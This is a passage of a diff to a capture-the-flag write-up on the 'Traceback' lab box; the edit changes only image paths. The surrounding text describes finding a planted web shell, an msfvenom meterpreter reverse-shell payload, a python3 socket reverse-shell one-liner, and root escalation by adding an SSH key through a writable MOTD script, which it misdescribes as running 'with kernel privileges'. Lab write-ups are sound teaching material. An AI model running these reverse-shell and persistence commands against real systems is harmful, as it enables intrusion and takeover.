@@ -60,19 +60,19 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 So out of that, there's only 2 ports - not a lot to go off of. Since SSH (port 22) probably won't yield anything interesting, start with HTTP (port 80). Browsing to the home page gives us a really intersting scene; it appears to be a website that has been compromised and defaced by Xh4H. Since it's been compromised, it's not a terrible assumption that the attacker has left a backdoor into the system for our use so let's try to find it. Inspecting the source code leaves us with the following comment:
 
-![HTTP Source Comment](../assets/images/traceback/http_source_comment.png)
+![HTTP Source Comment](/assets/images/traceback/http_source_comment.png)
 
 If the text of that comment is run through Google, it should lead to Xh4H's own GitHub page. Checking out the repositories leeads to one titled "Web-Shells" and a description that matches. Inside the repository there are quite a few files - no surprise there, as there are many possibilities for web shells in both form and function. By trying the different filenames in the format of `traceback.htb/<webshell>.php`, eventually the smevk.php backdoor is discovered:
 
-![Smevk webshell discovery](../assets/images/traceback/smevk_webshell_found.png)
+![Smevk webshell discovery](/assets/images/traceback/smevk_webshell_found.png)
 
 Fantastic! Going back to Xh4h's GitHub, the username and password are found in `smevk.php`:
 
-![smevk.php webshell creds](../assets/images/traceback/smevk_webshell_credentials.png)
+![smevk.php webshell creds](/assets/images/traceback/smevk_webshell_credentials.png)
 
 Logging in with the found credentials grants access to a web UI that sits on top of the webshell. It has a ton of helper functionality built-in; we can use the tools it ships with to migrate to a more stable command shell. There are plenty of ways to go about this, but since we're not worried about any kind of stealth or AV evasion I'll create a payload with msfvenom and then upload it to disk and execute. In order to accurately perform this, make sure to enumerate properly with the webshell - things like architecture, writeable directories, etc. will go a long way in guaranteeing success when creating payloads. To generate a payload, I ran `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443`. From there, upload it to the victim server - your choice how this is achieved - and make sure to `chmod` it so that it can be executed. Once we execute the payload, we should receive a meterpreter shell:
 
-![Reverse shell connection](../assets/images/traceback/revshell_connect.png)
+![Reverse shell connection](/assets/images/traceback/revshell_connect.png)
 
 ## >>GETTING PROMOTED - WEBADMIN TO SYSADMIN
 
@@ -96,7 +96,7 @@ What does this mean? This tells us three things:
 
 Here's the problem - we're currently doing this within a meterpreter shell, and trying to execute the program within it goes south rather quickly:
 
-![Executing the luvit command in meterpreter](../assets/images/traceback/luvit_repl.png)
+![Executing the luvit command in meterpreter](/assets/images/traceback/luvit_repl.png)
 
 To fix this (the easy way), I chose to migrate to a regular ncat reverse shell and then upgrade to a full TTY from there. The easiest way to do this is with python3, which is present on the server. Start an `ncat` listener to catch it then execute the following:
 ```python
@@ -104,7 +104,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 This should give us a shell under the same privileges that we currently have. However, it *doesn't* give us a full TTY. Let's fix that. [This ropnop blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) shows how to upgrade - my version is below.
 
-![Upgrading to a full TTY](../assets/images/traceback/tty_upgraded.png)
+![Upgrading to a full TTY](/assets/images/traceback/tty_upgraded.png)
 
 Now that we're upgraded, the fun begins. Re-visiting our discovery from `sudo -l`, we execute `sudo -u sysadmin /home/sysadmin/luvit` - this drops us into a Luvit instance running on the box *as sysadmin*. That's fantastic, but how do we use this to our advantage? Let's check out the text file we found in the home directory:
 
@@ -128,19 +128,19 @@ To recap what we've accomplished thus far, we've:
 
 As the sysadmin user, we don't appear to have access to much in our home directory - just user.txt and some standard files on Linux. Running our normal enumeration scripts (hello LinPEAS and Linenum!) nets us a ton of information, but one thing in particular stands out. Looking through the output of `ps aux` we see this *really, really odd cp* line...
 
-![Odd cp command being run](../assets/images/traceback/cp_motd.png)
+![Odd cp command being run](/assets/images/traceback/cp_motd.png)
 
 This is cause for some investigation. Checking `/var/backups` doesn't lead to anything other than permission errors, but if we check the other side we find this set of files that are *ALL* writeable by `sysadmin`:
 
-![List of writeable files](../assets/images/traceback/cp_motd_perms_destination.png)
+![List of writeable files](/assets/images/traceback/cp_motd_perms_destination.png)
 
 If you don't know what `.update-motd.d` is, no worries - [this article](https://www.putorius.net/custom-motd-login-screen-linux.html) has you covered for the basics. The TL;DR of it is that anything placed in `.update-motd.d` is added in to the message-of-the-day banner, including code that can be run. When it is executed, it does so with kernel privileges - this makes it a prime target for us to snag privilege escalation with. I decided to sneak an additional line into `00-header` that will add another SSH key into root's authorized_keys file so that I can SSH in as root. I start with replacing the `/etc/.update-motd.d/00-header` file with my new-and-evilly-improved version, then SSH in *a second time* as `sysadmin` to trigger the subverted MOTD banner. Once I've done this we can see a line that I've added `you know what this means` - and can be assured that the script ran:
 
-![SSH key added successfully!](../assets/images/traceback/ssh_privesc_key_added.png)
+![SSH key added successfully!](/assets/images/traceback/ssh_privesc_key_added.png)
 
 Now all that's left to do is log in as root with our new root key by doing `ssh -i privesc root@traceback.htb`:
 
-![SSH'ing as root never looked so good](../assets/images/traceback/ssh_as_root.png)
+![SSH'ing as root never looked so good](/assets/images/traceback/ssh_as_root.png)
 
 From here, do whatever you please - you're root after all!
 
